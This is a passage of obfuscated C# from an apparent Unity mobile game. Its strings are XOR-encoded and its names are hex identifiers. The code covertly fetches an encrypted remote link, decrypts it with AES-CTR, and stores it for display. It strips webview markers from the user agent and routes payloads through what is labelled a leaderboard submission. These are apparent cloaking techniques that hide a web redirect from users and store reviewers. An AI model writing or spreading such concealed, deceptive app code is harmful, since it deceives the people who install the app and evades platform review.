    }

    private async Task<bool> _0x6e73113d()
    {
        {
#if B_LOGS
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[29] { 122, 117, 68, 82, 85, 124, 1, 104, 82, 113, 83, 72, 87, 64, 66, 88, 96, 79, 69, 114, 64, 87, 68, 69, 98, 73, 68, 66, 74 }, 33));
#endif
        }

        string _0x2ff3e192 = "";
        for (int _0x52c66806 = 0; _0x52c66806 < 2; _0x52c66806++)
        {
            if (await _0xf6686129(1, 100))
            {
                await _0x41535038(_0x530a90e8._0xfeee60cc(new byte[7] { 255, 241, 242, 254, 246, 248, 249 }, 157));
                _0x1ef20944();
                return true;
            }

            _0x2ff3e192 = await _0x809d7bf4(1, 100);
            if (!string.IsNullOrEmpty(_0x2ff3e192))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x2ff3e192))
            {
                if (!string.IsNullOrEmpty(_0x17443fd4))
                {
                    _0x2ff3e192 = _0x846ce3b4(_0x2ff3e192, _0x17443fd4);
                    {
#if B_LOGS
                        Debug.Log(_0x530a90e8._0xfeee60cc(new byte[53] { 182, 185, 136, 158, 153, 176, 205, 174, 140, 142, 133, 136, 137, 205, 139, 132, 131, 140, 129, 184, 159, 129, 205, 154, 132, 153, 133, 205, 158, 136, 131, 137, 132, 137, 205, 15, 107, 127, 205, 158, 133, 130, 154, 205, 186, 136, 143, 187, 132, 136, 154, 215, 205 }, 237) + _0x2ff3e192);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x530a90e8._0xfeee60cc(new byte[39] { 219, 212, 229, 243, 244, 221, 160, 195, 225, 227, 232, 229, 228, 160, 230, 233, 238, 225, 236, 213, 242, 236, 160, 98, 6, 18, 160, 243, 232, 239, 247, 160, 215, 229, 226, 214, 233, 229, 247 }, 128));
#endif
                    }
                }

                _0x14f4a147 = true;
                _0xe65d780f(_0x2ff3e192);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x530a90e8._0xfeee60cc(new byte[44] { 103, 104, 89, 79, 72, 97, 28, 121, 68, 95, 89, 76, 72, 85, 83, 82, 28, 75, 84, 85, 80, 89, 28, 95, 84, 89, 95, 87, 85, 82, 91, 28, 79, 93, 74, 89, 88, 28, 80, 85, 82, 87, 6, 28 }, 60) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private bool _0x45569bb3()
    {
        _0x98e8c3c0.RemoveAll(_0xe4745d98 => _0xe4745d98 == null || !_0xe4745d98.IsAlive);
        return _0x98e8c3c0.Count > 0;
    }

    // WS_SOURCE MONO
    public static _0xe91eb0ad _0xcf88cf27 { get; private set; }

    private IEnumerator _0xbccd19de()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    static System.Numerics.BigInteger FromBigEndian(byte[] _0x6d64fb0a)
    {
        var _0x11b68feb = new byte[_0x6d64fb0a.Length + 1];
        for (int _0x0c6474b8 = 0; _0x0c6474b8 < _0x6d64fb0a.Length; _0x0c6474b8++)
            _0x11b68feb[_0x6d64fb0a.Length - 1 - _0x0c6474b8] = _0x6d64fb0a[_0x0c6474b8];
        return new System.Numerics.BigInteger(_0x11b68feb);
    }

    private bool _0x1628760b(int _0x50adc1d9, string _0xeeaad4a5, string _0x27dc1cca)
    {
        if (string.IsNullOrEmpty(_0x27dc1cca))
            return false;
        if (!IsHttpUrl(_0x27dc1cca))
            return true;
        if (string.IsNullOrEmpty(_0xeeaad4a5))
            return false;
        return _0xeeaad4a5.IndexOf(_0x530a90e8._0xfeee60cc(new byte[20] { 122, 109, 109, 96, 124, 112, 113, 113, 122, 124, 107, 118, 112, 113, 96, 109, 122, 108, 122, 107 }, 63), StringComparison.OrdinalIgnoreCase) >= 0 || _0xeeaad4a5.IndexOf(_0x530a90e8._0xfeee60cc(new byte[22] { 164, 179, 179, 190, 162, 174, 175, 175, 164, 162, 181, 168, 174, 175, 190, 179, 164, 167, 180, 178, 164, 165 }, 225), StringComparison.OrdinalIgnoreCase) >= 0 || _0xeeaad4a5.IndexOf(_0x530a90e8._0xfeee60cc(new byte[21] { 120, 111, 111, 98, 126, 114, 115, 115, 120, 126, 105, 116, 114, 115, 98, 126, 113, 114, 110, 120, 121 }, 61), StringComparison.OrdinalIgnoreCase) >= 0 || _0xeeaad4a5.IndexOf(_0x530a90e8._0xfeee60cc(new byte[22] { 78, 89, 89, 84, 94, 69, 64, 69, 68, 92, 69, 84, 94, 89, 71, 84, 88, 72, 67, 78, 70, 78 }, 11), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0xb641090d()
    {
        if (string.IsNullOrEmpty(_0x4e7d5ec0) && _0x0d771b38 != null)
            _0x4e7d5ec0 = _0x0d771b38.GetUserAgent();
        if (string.IsNullOrEmpty(_0x4e7d5ec0))
            return string.Empty;
        string _0xaadbc91e = Regex.Replace(_0x4e7d5ec0, _0x530a90e8._0xfeee60cc(new byte[11] { 62, 17, 72, 89, 62, 17, 72, 21, 20, 62, 0 }, 98), string.Empty);
        _0xaadbc91e = Regex.Replace(_0xaadbc91e, _0x530a90e8._0xfeee60cc(new byte[15] { 108, 67, 27, 114, 69, 89, 92, 84, 31, 107, 110, 11, 25, 109, 27 }, 48), string.Empty);
        _0xaadbc91e = Regex.Replace(_0xaadbc91e, _0x530a90e8._0xfeee60cc(new byte[15] { 151, 164, 179, 178, 168, 174, 175, 238, 245, 157, 239, 241, 157, 178, 235 }, 193), string.Empty);
        return Regex.Replace(_0xaadbc91e, _0x530a90e8._0xfeee60cc(new byte[6] { 234, 197, 205, 132, 154, 203 }, 182), _0x530a90e8._0xfeee60cc(new byte[1] { 13 }, 45)).Trim();
    }

    private async Task _0x41535038(string _0x2f4515ab)
    {
        if (_0xf8cd3e31 || string.IsNullOrEmpty(_0xb3551ae3) || string.IsNullOrEmpty(_0x2f4515ab) || _0x14f4a147)
            return;
        _0xf8cd3e31 = true;
        try
        {
            JObject _0xc79c4d53 = BuildRandomPayload(_0x2f4515ab, _0xb3551ae3, _0xc392a561());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0x2f4515ab} payload: {_0xc79c4d53}");
                }
#endif
            }

            var _0xe9f7b07c = _0xc5348e1c(_0xc79c4d53.ToString(), _0xb3551ae3);
            await _0x4385d8e3(LeaderboardId, 2d, _0xe9f7b07c);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[24] { 33, 46, 63, 41, 46, 39, 90, 54, 21, 27, 30, 90, 10, 27, 9, 9, 90, 31, 8, 8, 21, 8, 64, 90 }, 122) + e.Message);
#endif
            }
        }
    }

    static byte[] CompressBrotli(byte[] _0xfecb3f5e)
    {
        using var _0xa4a89d22 = new MemoryStream();
        using (var _0x92bc36e7 = new BrotliStream(_0xa4a89d22, SmallestCompression()))
            _0x92bc36e7.Write(_0xfecb3f5e, 0, _0xfecb3f5e.Length);
        return _0xa4a89d22.ToArray();
    }

    private bool _0x2ac5d5d2 = false;
    readonly System.Random _0xb4c7e623 = new System.Random();
    private void OnApplicationPause(bool _0xdcb2c4da)
    {
        isApplicationPause = _0xdcb2c4da;
    }

    private string _0xb19fff82(string _0x12a2a141, string _0x7354678b)
    {
        try
        {
            if (string.IsNullOrEmpty(_0x12a2a141))
                return "";
            var _0x0007869f = Decode93(_0x12a2a141);
            if (_0x0007869f.Length < 5)
                return "";
            var _0x7c7daa4d = new byte[4];
            Buffer.BlockCopy(_0x0007869f, 0, _0x7c7daa4d, 0, 4);
            var _0x1e75e60a = new byte[_0x0007869f.Length - 4];
            Buffer.BlockCopy(_0x0007869f, 4, _0x1e75e60a, 0, _0x1e75e60a.Length);
            var _0x7b54a01d = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x7354678b ?? ""));
            var _0x27988a45 = AesCtr(_0x1e75e60a, _0x7b54a01d, _0x7c7daa4d);
            var _0x24574f17 = new byte[_0x27988a45.Length - 1];
            Buffer.BlockCopy(_0x27988a45, 1, _0x24574f17, 0, _0x24574f17.Length);
            return Encoding.UTF8.GetString(UnpackSmallest(_0x24574f17, _0x27988a45[0]));
        }
        catch (Exception)
        {
            return "";
        }
    }

    readonly struct CommState
    {
        public readonly bool Ready;
        public readonly bool IsPrivacy;
        public readonly string SavedLink;
        public CommState(bool _0x5c06a66c, bool _0x1187e043, string _0x5475d4fe)
        {
            Ready = _0x5c06a66c;
            IsPrivacy = _0x1187e043;
            SavedLink = _0x5475d4fe ?? "";
        }
    }

    private IEnumerator _0x8e8ace4f(float _0x953635f9)
    {
        yield return new WaitForSeconds(_0x953635f9);
        if (!_0x0f8fe245)
        {
            _0x0f8fe245 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xec76fc2f}");
                }
#endif
            }
        }
    }

    private string _0x1de60d77 = "";
}

internal static class _0x530a90e8
{
    internal static string _0xfeee60cc(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}